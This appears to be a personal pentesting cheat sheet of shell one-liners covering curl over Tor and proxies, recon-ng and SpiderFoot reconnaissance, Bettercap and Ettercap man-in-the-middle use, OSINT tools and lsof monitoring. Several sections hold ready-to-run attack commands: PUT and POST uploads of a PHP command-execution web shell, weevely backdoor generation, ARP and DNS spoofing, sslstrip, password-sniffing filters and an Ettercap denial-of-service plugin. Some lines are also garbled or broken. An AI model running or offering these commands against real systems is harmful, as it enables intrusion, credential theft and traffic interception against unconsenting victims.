##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Curl - Socket Creation + Manipulation Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##






## --------------------------- ##
##   [?] follow redirects
##   [?] set user-agent
##   [?] set method - GET
## --------------------------- ##
curl -Iks --location -X GET -A "x-agent" $Domain


## --------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------- ##
curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:4444 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:9050 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:1080 $Domain



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Clearnet access via HTTP/SOCKS <<---------------------------------------------||
##-======================================================================================================================================-##
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI -x 127.0.0.1:8118 ${webhost}									## Fetch via HTTP proxy as root
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${webhost}					## Fetch via HTTP proxy as anon
    curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}					## Fetch via SOCKS proxy as root
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}	## Fetch via SOCKS proxy as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI --socks5 127.0.0.1:9050 ${webhost}							## Fetch via SOCKS proxy w/ local DNS as root
    sudo -n -u anon curl -fsSI --socks5 127.0.0.1:9050 ${webhost}			## Fetch via SOCKS proxy w/ local DNS as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

##-======================================================================================================================================-##
##  ||---------------------------------------->> Fetch Over SOCKS5 Using Privoxy And Local DNS <<-------------------------------------||
##-======================================================================================================================================-##
## 
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via privoxy
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via SOCKS5 proxy as privoxy 
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

torify openssl s_client -connect $ONION:$PORT
torify openssl s_client -connect $ONION:$PORT -showcerts
torify openssl s_client -connect $ONION:$PORT -showcerts 2>/dev/null |  openssl x509 -in /dev/stdin -noout -fingerprint |  awk -F'=' '{print $2}' |  tr -d ':'



## ---------------------------------------------- ##
##  [+] Testing connection to the remote host
## ---------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ---------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ---------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## ----------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl cipher
## ----------------------------------------------------------------------- ##
openssl s_client -cipher 'AES128-SHA' -connect $Domain:443





curl --socks5-hostname 127.0.0.1:9050 -o $File $URL
curl --socks5-hostname 127.0.0.1:9150 -o $File $URL


##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy - Secure TLS Cpnnection
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 $URL
curl --proxy "socks5h://localhost:9150" --tlsv1.2 $URL

 - Firefox User Agent 
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL

##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy + TLS + Firefox User Agent 
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Darknet access via HTTP/SOCKS <<----------------------------------------------||
##-======================================================================================================================================-##
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${onionhost}						## Fetch via .onion via HTTP proxy as anon
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${onionhost}		## Fetch .onion via SOCKS proxy as anon
##-======================================================================================================================================-##



##-======================================-##
##   [+] Curl SOCKS5 Proxy Connection:
##-======================================-##
curl -s -m 10 --socks5 $hostport --socks5-hostname $hostport -L $URL


curl --socks5 127.0.0.1:9150
curl --http-proxy=socks4a://127.0.0.1:9050
curl --socks5 127.0.0.1:9150

curl -v --socks5-hostname localhost:9050 http://jhiwjjlqpyawmpjx.onion

curl --resolve 127.0.0.1:4444:http://killyourtv.i2p/killyourtv.asc


curl ifconfig.co --socks5-host 10.64.0.1
curl ifconfig.co --socks5-host nl1-wg.socks5.mullvad.net

curl -sSL https://api.mullvad.net/wg/ -d account="$ACCOUNT" --data-urlencode pubkey="$(wg pubkey <<<"$PRIVATE_KEY")"

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/ | jq -r ".countries[] | (.code + \" - \" + .name + \" \" + ( .cities[] | (.name + \";\" + (.relays[].hostname / \"-\")[0] + \"-wg.socks5.mullvad.net\" ) )  ) + \":1080\" " | awk '{split($0,a,";"); print a[2] " [SOCKS5] "  "["a[1]"]"}' | sed s/","/" -"/g

wg.socks5.mullvad.net


curl -sSm 10 https://am.i.mullvad.net

curl -sSm 10 --interface wg0 https://am.i.mullvad.net




##-====================================-##
##  [+] Pretend to be a Google Bot
##-====================================-##
curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' $Domain







##-=========================-##
##  [+] Grab HTTP Headers
##-=========================-##
curl -LIN $Domain

curl --trace - --trace-time $Domain

curl -A '' $Domain                          ## Remove the User Agent

curl -A '' -H 'User-Agent;' $Domain         ## Send an Empty User Agent

curl -c cookies.txt $Domain                 ## Save Cookies to a File

curl -b cookies.txt $Domain                 ## Load Cookies from a File



##-=================================-##
##  [+] Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php






##-================================================-##
##  [+] List FTP server contents:
##-================================================-## 
curl -u $FTPUser:$FTPPass -O ftp://$host/$Path/


##-================================================-##
##  [+] Upload a file to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T $Filename ftp://$URL


##-================================================-##
##  [+] Upload multiple files to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T "{$File1,$File2}" ftp://$URL


##-================================================-##
##  [+] Upload a file from STDIN to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T - ftp://$URL/$Path/$Filename






## --------------------------------- ##
##   [+] curl - connection statistics:
## --------------------------------- ##
URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s conn %{time_connect}s time %{time_total}s\nSpeed %{speed_download}bps Size %{size_download}bytes\n" -o/dev/null -s $URL


## ---------------------------------------------- ##
##    [+] Curl - Send email through the gmail API
## ---------------------------------------------- ##
##    [?]  smtp.gmail.com   || port: 465
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt

## ---------------------------------------------------------------- ##
##    [+] Gmail - Check your unread Gmail from the command line
## ---------------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"


## -------------------------------------------------------- ##
##    [+] Gmail - Check   ???   from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*?<name>(.*?)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*<name>(.*)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
curl -u username --silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'


## ---------------------------------------------- ##
##   [+] Curl - Fetch an email from GMail:
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt





##-==============================================-##
##   [+] Curl - Check for title and all links
##-==============================================-##
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-============================================-##
##   [+] Curl - Look at page with just text
##-============================================-##
curl $IP -s -L | html2text -width '99' | uniq


##-=======================================================-##
##   [+] Curl -  Get Options available from web server
##-=======================================================-##
curl -vX OPTIONS http://$IP/


##-===================================================-##
##   [+] Curl -  Check if it is possible to upload
##-===================================================-##
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php



##-===================================================-##
##   [+] Curl -  upload a file using the PUT method
##-===================================================-##
curl -T 'leetshellz.txt' 'http://$IP'
        

##-=======================================================================-##
##   [+] Curl -  rename it to an executable file using the MOVE method:
##-=======================================================================-##
curl -X MOVE --header 'Destination:http://$IP/leetshellz.php' 'http://$IP/leetshellz.txt'





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SpiderFoot - Enum + Recon + API - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


python3 /usr/share/sniper/bin/
github-subdomains.py -t $GITHUB_API_TOKEN -d $TARGET 
$DIR/domains/domains-$TARGET-github.txt






*************************************************************
 Use SpiderFoot by starting your web browser of choice and 
 browse to http://127.0.0.1:8099
*************************************************************



spiderfoot -l 127.0.0.1:8099
http://127.0.0.1:8099





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Recon-ng - Enum + Recon + API - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##   [+] Show API keys 

[recon-ng][default] > keys list



use recon/domains-contacts/whois_pocs
run

[recon-ng][default] > keys add bing_api $Key
[*] Key 'bing_api' added.

use recon/domains-hosts/bing_domain_api
run
use recon/domains-hosts/bing_domain_web
run
use recon/domains-hosts/builtwith
run

use recon/domains-hosts/hackertarget
run
use recon/domains-hosts/netcraft
run



Add the Shodan API key:
keys add shodan_api $Key


use recon/hosts-ports/shodan_ip
run
use recon/domains-hosts/shodan_hostname
run


use recon/contacts-profiles/fullcontact
run



use recon/netblocks-companies/whois_orgs
run
use recon/netblocks-hosts/shodan_net
run
use recon/netblocks-ports/censysio
run


keys add ipinfodb_api $Key
[recon-ng][TM][interesting_files] > use recon/hosts-hosts/ipinfodb
[recon-ng][TM][ipinfodb] > run

use recon/hosts-hosts/ipinfodb
run


[recon-ng][interesting_files] > load recon/contacts-social/twitter
[recon-ng][twitter] > keys add twitter_api $Key
[*] Key 'twitter_api' added.
[recon-ng][twitter] > keys add twitter_secret $Key
[*] Key 'twitter_secret' added.

[recon-ng][default][twitter] > run




use recon/hosts-hosts/ssltools
run


use recon/domains-hosts/brute_hosts >> $domain$stamp.resource
echo "set WORDLIST /usr/share/recon-ng/data/sorted_knock_dnsrecon_fierce_recon-ng.txt" >> $domain$stamp.resource
echo "set SOURCE $domain" >> $domain$stamp.resource
echo "run" >> $domain$stamp.resource


echo "use recon/netblocks-companies/whois_orgs" >> $domain$stamp.resource
echo "set SOURCE $domain" >> $domain$stamp.resource
echo "run"



## Add the target domain
> add domains $Domain

workspaces add $Domain
workspaces select $Domain

## Double check if domain is added
> show domains

## check added hosts
> show hosts



[recon-ng][$Domain] > show ports

[recon-ng][$Domain] > show hosts

[recon-ng][$Domain] > show contacts

show modules


> load geocode
> use recon/locations-locations/geocode

> show options
> show info
> set SOURCE query SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL
> run


## Check locations
> show locations

## Now reverse
> load reverse
> use recon/locations-locations/reverse_geocode
> run




show modules
use recon/domains-vulnerabilities/punkspider

Show module
use recon/domains-vulnerabilities/xssed
Show Options
Set source Microsoft.com
Show Options
RUN









use	recon/contacts/gather/http/api/whois_pocs
[recon‐ng][default][whois_pocs] > show options
[recon-­ng][default][whois_pocs] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][recon-­ng][default][whois_pocs] > run

use recon/hosts/enum/http/web/xssed
[recon‐ng][xssed] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][xssed] > run

[recon‐ng]> use recon/hosts/gather/http/web/google_site
[recon‐ng][google_site] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][google_site] > run

[recon‐ng]> use recon/hosts/gather/http/web/ip_neighbor
[recon‐ng][ip_neighbor] > set SOURCE cisco.com
SOURCE => cisco.com
[recon‐ng][ip_neighbor] > run




testssl.sh --add-ca companyCA1.pem,companyCA2.pem ADDTL_CA_FILES=companyCA1.pem,companyCA2.pem 

testssl.sh 


keytool -list -rfc -keystore lib/security/cacerts | grep -E -v '^$|^\*\*\*\*\*|^Entry |^Creation |^Alias '


##-============================================================-##
##   [+] pull all certificates from Windows Update services:
##-============================================================-##
CertUtil -syncWithWU -f -f


http://aka.ms/RootCertDownload
https://technet.microsoft.com/en-us/library/dn265983(v=ws.11).aspx#BKMK_CertUtilOptions). 



## ------------------------------------------ ##
##   [?] They are in DER format
##   [?] Convert them using the following:
## ------------------------------------------ ##
for f in *.cer; do echo $File >/dev/stderr; openssl x509 -in $File -inform DER -outform PEM ;done >/tmp/Microsoft.pem




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Bettercap - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=================================================================-##
##   [+] Bettercap - MITM Framework - Swiss Army Knife for 802.11
##-=================================================================-##
bettercap -iface eth0 -X --proxy -O $File.log

bettercap -iface eth0 -caplet $File.cap



##-===========================-##
##   [+] Bettercap - WebUI 
##-===========================-##
bettercap -caplet http-ui

bettercap -caplet https-ui -iface eth0





bettercap -eval "set arp.spoof.targets $IP; arp.spoof on"



## ----------------------------------------------------- ##
##   [?] Bettercap - DNS Spoof Module - DNS Spoofing
## ----------------------------------------------------- ##
dns.spoof on
set dns.spoof.domains
set dns.spoof.address 
set dns.spoof.all true


## ------------------------------------------------------------ ##
##   [?] Bettercap - Net Sniff Module - Full Traffic Capture
## ------------------------------------------------------------ ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.output 'capture.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - Net Sniff Module - Password Sniffing
## --------------------------------------------------------- ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.regexp '.*password=.+'
set net.sniff.output 'passwords.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - HTTPS Proxy
## --------------------------------------------------------- ##
arp.spoof on
http.proxy on
set net.sniff.verbose 'true'
set https.proxy.sslstrip true
set arp.spoof.targets $IP
hstshiack/hstshijack
net.sniff on




bettercap -eval "help net.recon; q"





##  [+] ARP Cache Poisoning
arpspoof -t <ip victime> <ip gateway> -r
arpspoof -i <interface (eth0)> <ip gateway>


##  [+] Bettercap (ARP Cache Poisoning)
bettercap -X --proxy -O bettercap.log







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Ettercap - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




etterfilter $rrr -o filter.ef


ettercap -T -Q -i $interface -F $find2/$filname -M arp /$rou/ /$targ/


ettercap -T -Q -i $interface -P find_ip -M arp // // | grep "find_ip:" | awk '{print}'


ettercap -T -Q -i $interface -P dos_attack -M arp // //


sslstrip.py -p -w ~/opensource/logs/$SESSION.log -l 10000 &


ettercap -T -q -i $interface -w ~/opensource/logs/$SESSION.pcap -L ~/opensource/logs/$SESSION -M arp /$ROUTER/ /$VICTIM/


ettercap -T -Q -i $interface -P remote_browser -M arp /$rou/ /$targ/


##-========================================================-##
##   [+] Ettercap - DNS SPOOFING {redirect web-domains}
##-========================================================-##
ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou/ /$targ/


##-=================================================================-##
##   [+] Ettercap - LocalNet MITM Attack - Capture TCP/IP Packets
##-=================================================================-##
ettercap -T -Q -i $interface -M arp /$TargetIP/ /$GatewayIP/


##-======================================================-##
##   [+] Ettercap - Sniff Pictures on Remote Machine:
##-======================================================-##
driftnet -i $interface -d ~/opensource/netool-capture & ettercap -T -Q -i $interface -M arp /$targ/ /$rou/



##-=============================================-##
##   [+] Ettercap - 
##-=============================================-##
ettercap -T -M arp -V [hex,ascii] /x.x.x.x/ /x.x.x.x/
ettercap -T -P repoision_arp -M arp:remote /10.10.102.50/ /10.10.102.5/

ettercap -Tq -M arp:remote -P remote_browser (-P repoison arp) /10.10.102.100/ /10.10.102.4,5/


##-====================================-##
##   [+] MITM IPv6 Report Parasite6
##-====================================-##
ettercap -Tq -w fichero -M ndp:oneway //fe80:xxxxx? //fe80:xxxxx/

fake_router6 eth0 1::/64


##-=============================================-##
##   [+] Ettercap - 
##-=============================================-##
etterfilter filtro.filter -i filtro.ef
ettercap -Tq -F ./filtro.ef -M arp_remote -P repoision_arp /10.10.102.60/ 10/10/10








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Cookie Stealing - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------------ ##
##   [?] Cookie Stealing:
## ------------------------------------------------ ##


##-===============================-##
##   [+] Save Cookies To A File
##-===============================-##
curl -c cookies.txt $Domain


##-=================================-##
##   [+] Load Cookies from a File
##-=================================-##
curl -b cookies.txt $Domain


##-=================================-##
##   [+] WGet - Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php


##-============================-##
##   [+] Curl - POST File
##-============================-##
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"


##-=============================================-##
##   [+] Curl - POST Binary Data to Web Form
##-=============================================-##
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v


##-========================================================-##
##   [+] Curl - PUTing File on the Webhost via PUT verb
##-========================================================-##
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php











##-================================-##
##   [+] 
##-================================-##
sslstrip -w sslstrip.log -l 8080


##-================================-##
##   [+] Monitor all TCP ports:
##-================================-##
urlsnarf -i eth0 tcp


##-================================-##
##   [+] Monitor on TCP $Port:
##-================================-##
urlsnarf tcp port $Port





##-=================================================================-##
##   [+] Socat - Listen on 1234 and Forward To Port 80 on 2.2.2.2
##-=================================================================-##
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Regex - XArgs + Cut + Grep + Awk - Txt Manipulation
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================================-##
##   [+] Bulk Download Files By Their URLs
##-===========================================-##
## ------------------------------------------------ ##
##   [?] The URL Links Are Fed To Curl From xarg
## ------------------------------------------------ ##
xargs -n 1 curl -O < $File


##-=================================================-##
##   [+] Recursively fetch list of URLs with wget:
##-=================================================-##
cat $URLList.txt | xargs wget ???c


## ------------------------------------------ ##
##   [?] Pipe an IP address list into NMap
## ------------------------------------------ ##
cat $IPList.txt | xargs -n1 nmap -sV



##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget



##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget




tcpdump -i ethO -c 50 -tttt 'udp and port 53'


echo "##-==================================-##"
echo " 	  [+] Capture DNS Exfil Packets		"
echo "##-==================================-##"
tcdpump -w /tmp/dns -sO port 53 and host $Domain


##-================================================-##
##   [+] Cut the exfiled hex from the DNS packet
##-================================================-##
tcpdump -r dnsdemo -n | grep $Domain | cut -f9 -d | cut -fl -d'.' | uniq received. txt



##-=======================================================-##
##   [+] Host - Use bash loop to find IPs for each host:
##-=======================================================-##
for url in $(cat list.txt); do host $url; done


## ----------------------------------------------------------- ##
##   [+] Collect all the IPs from log and sort by frequency
## ----------------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn




##-===============================================================-##
##   [+] Find the ISPs of everyone who logged into your server
##-===============================================================-##
grep -o -E "Accepted publickey for .*" /var/log/auth.log | awk '{print $6}' | xargs -n1 whois | grep org-name



##-================================================================-##
##   [+] List the number and type of active network connections
##-================================================================-##
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c



##-=====================================================-##
##   [+] Monitor open connections for httpd
##   [+] including listen, count and sort it per IP
##-=====================================================-##
watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"

grep -i segfault /var/log/*							##  check for buffer overflows in logs
grep -i auth /var/log/* |grep -i failed				##  check authentication failed tries


##-==============================================================-##
##   [+] Show apps that use internet connection at the moment
##-==============================================================-##
lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2



##-=====================================================================-##
##   [+] View network activity of any application or user in realtime
##-=====================================================================-##
lsof -r 2 -p $PID -i -a



##-=============================================-##
##   [+] # Show current listening connections:
##-=============================================-##
lsof -Pni4 | grep LISTEN
lsof -nP -i TCP -s TCP:LISTEN
lsof -nP -i | awk '/LISTEN/ {print $2 " " $7 " " $8}'


##-===========================-##
##   [+] Check Connections
##-===========================-##
lsof -i | awk '{print $8}' | sort | uniq -c | grep 'TCP\|UDP'


##-===========================-##
##   [+] Check Established
##-===========================-##
lsof -i | grep ESTABLISHED
lsof -i -nP | grep ESTABLISHED | awk '{print $1, $9}' | sort -u


##-=======================-##
##   [+] Check Active
##-=======================-##
lsof -nP -iTCP -sTCP:ESTABLISHED | grep HTTPS


##-=======================-##
##   [+] Check LISTEN
##-=======================-##
lsof -i | grep LISTEN


##-======================================-##
##   [+] List all files opened by DHCP
##-======================================-##
lsof -c dhcpd



##-================================================-##
##   [+] use awk to parse the output of:
##       > Process name, PID, and process owner
##-================================================-##
lsof -nPi | awk '/LISTEN/ {print $1, $2, $3, $8, $9}'

lsof -i -nlP | awk '{print $1, $8, $9}' | sort -u
lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] metagoofil - OSINT Metadata Info Gathering Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================================================-##
##   [+] Extract public pdf, doc, and ppt files from $Domain
##-================================================================-##
## ---------------------------------------------------------------- ##
##   [?] (limited to 200 searches and 5 downloads)
## ---------------------------------------------------------------- ##
##   [?] save the downloads to "/root/Desktop/metagoofil/"
##   [?] output results to "/root/Desktop/metagoofil/result.html"
## ---------------------------------------------------------------- ##
##-================================================================-##
metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /$Dir/ -f /$Dir/$File.html



## ---------------------------------------------------------------------- ##
##    [?] Scan for PDFs (-t pdf) with specified $Domain (-d kali.org)
## ---------------------------------------------------------------------- ##
##    [?] searching 100 results (-l 100)
## ---------------------------------------------------------------------- ##
##    [?] download 25 files (-n 25)
## ---------------------------------------------------------------------- ##
##    [?] saving the downloads to a directory (-o kalipdf)
## ---------------------------------------------------------------------- ##
##    [?] saving the output to a file (-f kalipdf.html)
## ---------------------------------------------------------------------- ##
metagoofil -d $Domain.org -t pdf -l 100 -n 25 -o /$Dir/ -f $File.html


metagoofil -d $Domain -t pdf -l 200 -o /$Dir/ -f $File.html

metagoofil.py -d $Domain -t doc,pdf -l 200 -n 50 -o /$Dir/ -f $File.html
metagoofil.py -h yes -o /$Dir/ -f $File.html



metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html 2> /dev/null | tee $LOOT_DIR/osint/metagoofil-$TARGET.txt 2> /dev/null



metagoofil.py -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html 2> /dev/null | tee $LOOT_DIR/osint/metagoofil-$TARGET.txt



Perform document metadata searching on target domain using first 200 google results

metagoofil -d <target>.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html



##-====================================-##
##   [+] find subdomains available:
##-====================================-##
goorecon -s $Domain


##-==========================================-##
##   [+] Find email addresses for Domain:
##-==========================================-##
goorecon -e $Domain



goofile -d $Domain -f pdf
goofile -d $Domain -f doc
goofile -d $Domain -f docx
goofile -d $Domain -f pdf          
goofile -d $Domain -f ppt
goofile -d $Domain -f pptx
goofile -d $Domain -f txt          
goofile -d $Domain -f xls
goofile -d $Domain -f xlsx


automater -s robtex $IP



##-==============================================-##
##   [+] Phoneinfoga - Search a Phone Number
##-==============================================-##
phoneinfoga.py -n 1717-9539 --recon




enumiax
fping
hping3
medusa
mitmproxy
nasm
oscanner
p0f
powersploit
pwnat
crackmapexec
sbd
sfuzz
siege
skipfish
t50
webacoo

webshells
websploit
weevely


##-===========================================-##
##   [+] weevely - Generate a PHP backdoor
##-===========================================-##
weevely generate s3cr3t  
weevely http://$IP/weevely.php s3cr3t


## -------------------------------------------------------------------- ##
##   [?] Web Shag Web Application Vulnerability Assessment Platform  
## -------------------------------------------------------------------- ##
webshag-gui




etherwake

wpscan

xprobe

xsser
beef-xss

hexinject

cloud-enum

azure-cli

godoh
s3scanner
s3backer
node-aws4
awscli
cloudbrute
impacket-scripts
iodine

joomscan
laudanum



sherlock

swaks

ismtp
python3-shodan
emailharvester
instaloader
inspy




afl
doona
dhcpig 
enumiax
gvm
inviteflood

dnschef
dsniff
driftnet
bettercap
dnscap

## --------------------------------------------------------------------------------------- ##
##   [?] Unbound - a recursive-only caching DNS server that performs DNSSEC validation
## --------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------ ##
##   [?] dnsjit - Engine for capturing, parsing and replaying DNS 
## ------------------------------------------------------------------ ##
## 
## -------------------------------------------------------------------- ##
##   [?] drool - replay DNS traffic from packet capture (PCAP) files 
## -------------------------------------------------------------------- ##
## 
## --------------------------------------------------------------------------------- ##
